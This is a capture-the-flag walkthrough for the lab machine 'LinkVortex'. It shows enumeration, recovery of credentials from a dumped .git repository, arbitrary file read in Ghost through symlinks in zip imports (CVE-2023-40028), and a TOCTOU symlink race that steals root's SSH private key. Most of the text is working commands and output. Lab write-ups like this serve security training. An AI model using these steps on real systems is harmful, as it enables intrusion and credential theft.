# CTF Walkthrough: LinkVortex

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Information Gathering](#2-information-gathering)
- [3. Vulnerability Discovery](#3-vulnerability-discovery)
- [4. Exploitation](#4-exploitation)
- [5. Privilege Escalation](#5-privilege-escalation)

---

## 1. Introduction
 
**Category:** git dumping, Ghost, race condition, ssh
**Difficulty Level:** Easy   
**CVE(s) involved:** CVE-2023-40028

---

## 2. Information Gathering

### 2.1. Initial Enumeration
- **Running Services**
  - Command: `nmap -sC -sV 10.10.11.47`
      - Output: 
        ``` 
        PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey:
        |   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
        |_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
        80/tcp open  http    Apache httpd
        | http-robots.txt: 4 disallowed entries
        |_/ghost/ /p/ /email/ /r/
        |_http-server-header: Apache
        |_http-generator: Ghost 5.58
        |_http-title: BitByBit Hardware
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
        ```
- **Add to /etc/hosts**
    - Command: `sudo vim /etc/hosts/`

### 2.2. Directory/ File Enumeration or Subdomains
- **Check for subdomains**
  - Command: `gobuster vhost -w ~/cybersec/pentesting/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://linkvortex.htb --append-domain
`
  - Found: dev.linkvortex.htb
  
- **Found exposed .git directory**
  - Command: `gobuster dir -w ~/cybersec/pentesting/wordlists/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb
`
  - Found: /.git/

- **Use Git Dumper**
    - From `https://github.com/arthaud/git-dumper`
    - Command `python3 git_dumper.py http://dev.linkvortex.htb/.git/ ~/github/HTB/machines/linkvortex/gitdump`
    - Check git status 
        ```
        cd gitdump/
        git status
        ```
        - Output: 
          ```
          Not currently on any branch.
          Changes to be committed:
          (use "git restore --staged <file>..." to unstage)
          new file: Dockerfile.ghost
          modified: ghost/core/test/regression/api/admin/authentication.test.js
          ```

    - Check git diff `git diff --staged`
        - Output: 
          ```
          it('complete setup', async function () {
          const email = 'test@example.com';
          - const password = 'thisissupersafe';
          + const password = 'OctopiFociPilfer45';
          const requestMock = nock('https://api.github.com')
          .get('/repos/tryghost/dawn/zipball')
          ```

- **Log into Ghost admin**
  - Visit http://linkvortex.htb/ghost
  - Log in with:
    - Email: admin@linkvortex.htb
    - Password: OctopiFociPilfer45
  

---

## 3. Vulnerability Discovery

- **Create a directory to emulate Ghost path structure**
  - Command `mkdir -p exploit/content/images/
- **Create a symlink to a file for testing**
  - Command `ln -s /etc/passwd exploit/content/images/test-file.png`
  - Zip it 
    `zip -r -y exploit.zip exploit/`
- **Import the zip file to web**
  - Go to Settings > Labs > Import Content

- **Request the file**
  - Command: `curl http://linkvortex.htb/content/images/test-file.png`
      - Output:
        ```
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65534:sync:/bin:/bin/sync
        ```

---

## 4. Exploitation

- **Use a Proof of Concept**
  - Downlaod from https://github.com/0xyassine/CVE-2023-40028/tree/master
  - Change url endpoint
    ```
    #GHOST ENDPOINT
    GHOST_URL='http://linkvortex.htb'
    ```
- **Prompt to read the file at `/var/lib/ghost/config.production.json`**
      - Output:
        ```
        file> /var/lib/ghost/config.production.json
        <...SNIP...>
        "host": "linkvortex.htb",
        "port": 587,
        "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
        <...SNIP...>
        ```
- **SSH**
  - Commnad `ssh bob@linkvortex.htb`

- **User Flag obtained**
  - Flag : 62b09350943fdbc28d07e178eb7a277d

---

## 5. Privilege Escalation


- **Check for Sudo Rights**
  - Command: `sudo -l`
    - Output: 
        ```
        Matching Defaults entries for bob on linkvortex:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/s
        nap/bin, use_pty, env_keep+=CHECK_CONTENT
        User bob may run the following commands on linkvortex:
        (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
        ```

- **Check file permissions**
  - Command: `ls -la /opt/ghost/clean_symlink.sh`
      - Output: 
        ```
        -rwxr--r-- 1 root root 745 Nov 1 08:46 /opt/ghost/clean_symlink.sh
        ``` 
  - Cannot write, but read.
  - The script takes a .png file as input, checks if it's a symbolic link, and inspects the link's target. 
  - If the target points to sensitive directories like /etc or /root , it unlinks the file; otherwise, it moves
    it to a quarantine folder `/var/quarantined`. 

  - Once moved to quarantine and if the environment variable `CHECK_CONTENT` is set to true , it prints the content of the linked file.
  - A race condition called TOCTOU (Time-of-Check to Time-of-Use) opens up here. After the symlink is
    moved to quarantine, we can quickly swap the link target to point to a sensitive file such as
    /etc/shadow or even a private key for root such as `/root/.ssh/id_rsa` . If we also set
    `CHECK_CONTENT=true` , the script will read the sensitive file, bypassing the initial check!

- **Create a directory to emulate Ghost path structure**
  - Command `mkdir -p exploit2/content/images/`
- **Create a symlink to a file for testing**
  - Command `ln -s /ok exploit2/content/images/key.png`
  - Zip it 
    `zip -r -y exploit2.zip exploit2/`
- **Import the zip file to web**
  - Go to Settings > Labs > Import Content

- **Open another terminal**
  - Create an infinite loop to change the symlink to /root/.ssh/id_rsa
  - Command `while true;do ln -sf /root/.ssh/id_rsa
/var/quarantined/key.png;done`

- **Run the script**
  - `export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png`
      - Output:
        ```
        Link found [ /opt/ghost/content/images/key.png ] , moving it to quarantine
        Content:
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
        <...SNIP..>
        xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
        ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
        -----END OPENSSH PRIVATE KEY-----
        ```

- **SSH as root**
  - Copy the private key to a file named `root`
  - `chmod 600 root`
  - `ssh -i root root@linkvortex.htb`

- **Root Flag obtained**
  - Flag : fd42da09a7da1b29d7ed33cbfd983d71
---


